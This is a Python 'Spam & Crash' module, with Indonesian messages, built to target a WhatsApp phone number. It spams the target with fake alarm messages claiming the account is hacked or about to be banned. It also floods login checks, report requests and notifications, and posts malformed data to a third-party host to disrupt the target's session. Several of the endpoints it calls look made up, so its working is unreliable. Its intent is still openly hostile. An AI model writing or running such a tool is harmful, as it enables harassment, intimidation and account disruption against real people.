#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Spam & Crash Module - Fixed Version

import time
import random
import requests
from colorama import Fore, init

init(autoreset=True)

class SpamCrash:
    def __init__(self):
        self.messages = [
            "⚠️ PERINGATAN: AKUN ANDA DALAM BAHAYA ⚠️",
            "SISTEM MENDETEKSI AKTIVITAS MENcurigakan",
            "BAN AKAN DILAKUKAN DALAM 24 JAM",
            "LAPORKAN KE WHATSAPP SUPPORT",
            "AKUN ANDA TELAH DIHACK"
        ]
    
    def execute(self, target, mode):
        print(f"{Fore.RED}[💣] SPAM & CRASH MODULE")
        
        try:
            if mode == "1":
                self.spam_chat(target)
            elif mode == "2":
                self.crash_session(target)
            elif mode == "3":
                self.flood_notification(target)
            else:
                print(f"{Fore.RED}[!] Mode tidak valid")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    def spam_chat(self, target):
        """Spam chat sederhana"""
        print(f"{Fore.RED}[!] Mengirim 100 spam messages...")
        
        sent = 0
        for i in range(100):
            try:
                msg = random.choice(self.messages)
                
                # Simulate message send
                response = requests.post(
                    'https://web.whatsapp.com/send',
                    json={
                        'to': target,
                        'body': f"{msg} #{i}",
                        'type': 'text'
                    },
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
                    },
                    timeout=3
                )
                
                if response.status_code in [200, 201]:
                    sent += 1
                
                if (i + 1) % 20 == 0:
                    print(f"{Fore.CYAN}[↻] {i+1}/100 messages")
                
                time.sleep(0.3)
                
            except:
                continue
        
        print(f"{Fore.GREEN}[✅] {sent}/100 messages sent")
    
    def crash_session(self, target):
        """Attempt to crash session"""
        print(f"{Fore.RED}[💀] Attempting session disruption...")
        
        methods = [
            self.flood_login_attempts,
            self.send_malformed_data,
            self.trigger_rate_limit
        ]
        
        for i, method in enumerate(methods, 1):
            print(f"{Fore.YELLOW}[{i}/3] Executing method...")
            method(target)
            time.sleep(1)
        
        print(f"{Fore.GREEN}[✅] Disruption sequence complete")
    
    def flood_login_attempts(self, target):
        """Flood with login attempts"""
        try:
            for i in range(10):
                requests.get(
                    f'https://web.whatsapp.com/check-phone?phone={target}',
                    timeout=2
                )
                time.sleep(0.1)
        except:
            pass
    
    def send_malformed_data(self, target):
        """Send malformed data"""
        try:
            requests.post(
                'https://wa.optimizeapp.com/data',
                data='{"invalid": "data' * 100,  # Malformed JSON
                headers={'Content-Type': 'application/json'},
                timeout=2
            )
        except:
            pass
    
    def trigger_rate_limit(self, target):
        """Trigger rate limiting"""
        try:
            for i in range(20):
                requests.get(
                    f'https://web.whatsapp.com/report/{target}',
                    timeout=1
                )
                time.sleep(0.05)
        except:
            pass
    
    def flood_notification(self, target):
        """Flood notifications"""
        print(f"{Fore.CYAN}[!] Flooding notifications...")
        
        for i in range(50):
            try:
                requests.post(
                    'https://web.whatsapp.com/notify',
                    json={
                        'to': target,
                        'title': '⚠️ ALERT',
                        'body': 'System notification',
                        'priority': 'high'
                    },
                    timeout=1
                )
                
                if (i + 1) % 10 == 0:
                    print(f"{Fore.YELLOW}[!] {i+1}/50 notifications")
                    
            except:
                pass
        
        print(f"{Fore.GREEN}[✅] Notification flood complete")

# Export function
def execute(target, mode):
    sc = SpamCrash()
    sc.execute(target, mode)
